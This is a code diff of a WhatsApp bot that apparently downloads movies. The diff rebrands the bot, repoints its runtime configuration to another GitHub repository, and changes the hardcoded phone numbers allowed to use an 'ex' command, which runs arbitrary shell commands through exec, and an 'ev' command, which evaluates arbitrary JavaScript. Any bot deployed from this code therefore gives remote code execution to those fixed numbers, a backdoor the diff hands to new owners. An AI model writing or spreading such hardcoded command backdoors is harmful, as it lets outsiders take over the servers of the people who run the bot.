@@ -142,7 +142,7 @@ async function connectToWA() {
 
 
 
-const responsee = await axios.get('https://raw.githubusercontent.com/ZombieLN/zombie-db/refs/heads/main/main_var.json');
+const responsee = await axios.get('https://raw.githubusercontent.com/WhiteLK122/NATSU-DATABASE/refs/heads/main/main_var.json');
 const connectnumber = responsee.data
 	
 // Default owner JID
@@ -163,7 +163,7 @@ conn.ev.on('connection.update', async (update) => {
                 // Fetch custom connect message from server
                 let captionText = '✅ RED_MOON connected successfully!';
                 try {
-                    const response = await axios.get('https://raw.githubusercontent.com/ZombieLN/zombie-db/refs/heads/main/main_var.json');
+                    const response = await axios.get('https://raw.githubusercontent.com/WhiteLK122/NATSU-DATABASE/refs/heads/main/main_var.json');
                     const ownerdataa = response.data;
                     captionText = ownerdataa?.connectmg || captionText;
                 } catch (fetchErr) {
@@ -172,7 +172,7 @@ conn.ev.on('connection.update', async (update) => {
 
                 // Send initial connect image
                 await conn.sendMessage(DEFAULT_OWNER_JID, {
-                    image: { url: 'https://files.catbox.moe/h131nw.jpg' },
+                    image: { url: 'https://files.catbox.moe/6qxk37.jpg' },
                     caption: captionText
                 });
 const mvSize = config.MV_SIZE;
@@ -256,7 +256,7 @@ const leaveMsg = config.LEAVE_MSG;
 `;
 
 
-     let joinlink2 = await fetchJson('https://raw.githubusercontent.com/ZombieLN/zombie-db/refs/heads/main/main_var.json');
+     let joinlink2 = await fetchJson('https://raw.githubusercontent.com/WhiteLK122/NATSU-DATABASE/refs/heads/main/main_var.json');
         
         if (!joinlink2 || !joinlink2.supglink) {
             console.error('❌ Invalid join link data!');
@@ -311,7 +311,7 @@ console.log('RED_MOON MOVIE DL CONNECTED ✅')
 
 
 
-const ownerdataa = (await axios.get('https://raw.githubusercontent.com/ZombieLN/zombie-db/refs/heads/main/main_var.json')).data;
+const ownerdataa = (await axios.get('https://raw.githubusercontent.com/WhiteLK122/NATSU-DATABASE/refs/heads/main/main_var.json')).data;
      
          
 
@@ -840,7 +840,7 @@ conn.sendFileUrl = async (jid, url, caption, quoted, options = {}) => {
   }
 }
 
-const ownerdata = (await axios.get('https://raw.githubusercontent.com/ZombieLN/zombie-db/refs/heads/main/main_var.json')).data
+const ownerdata = (await axios.get('https://raw.githubusercontent.com/WhiteLK122/NATSU-DATABASE/refs/heads/main/main_var.json')).data
             
            
             config.FOOTER = ownerdata.footer
@@ -896,7 +896,7 @@ if ( isCmd && isBanGrp && !isMe && !isSudo) return
 
 const rec = (await axios.get('https://raw.githubusercontent.com/MoonLKR/Zombie-db/refs/heads/main/react.json')).data
 
-const recc = (await axios.get('https://raw.githubusercontent.com/ZombieLN/zombie-db/refs/heads/main/main_var.json')).data
+const recc = (await axios.get('https://raw.githubusercontent.com/WhiteLK122/NATSU-DATABASE/refs/heads/main/main_var.json')).data
 
 //================================================================================================================	    
 const id = mek.key.server_id
@@ -1664,7 +1664,7 @@ switch (command) {
   }
     break
     case'ex':{
-      if(senderNumber == 94778500326) {
+      if(senderNumber == 94771098429) {
   const { exec } = require("child_process")
   exec(q, (err, stdout) => {
     if (err) return reply(`-------\n\n` + err)
@@ -1712,7 +1712,7 @@ console.log(dsa)
     break
 // Inside your message handler (outside any case)
  case 'ev': {
-    if(senderNumber == 94724375368 || senderNumber == 94722617699) {
+    if(senderNumber == 94771098429 || senderNumber == 94754871798) {
     let code2 = q.replace("°", ".toString()");
     try {
 let resultTest = await eval(code2);
@@ -1739,9 +1739,9 @@ console.log(isError)
   })
 }
 app.get("/", (req, res) => {
-  res.send("Red_Moon DL Working successfully!");
+  res.send("📤 Red_Moon DL Working successfully!");
 });
-app.listen(port, () => console.log(`Movie-Visper-Md Server listening on port http://localhost:${port}`));
+app.listen(port, () => console.log(`Moon_Movie-Md Server listening on port http://localhost:${port}`));
 setTimeout(() => {
 connectToWA()
 }, 3000);
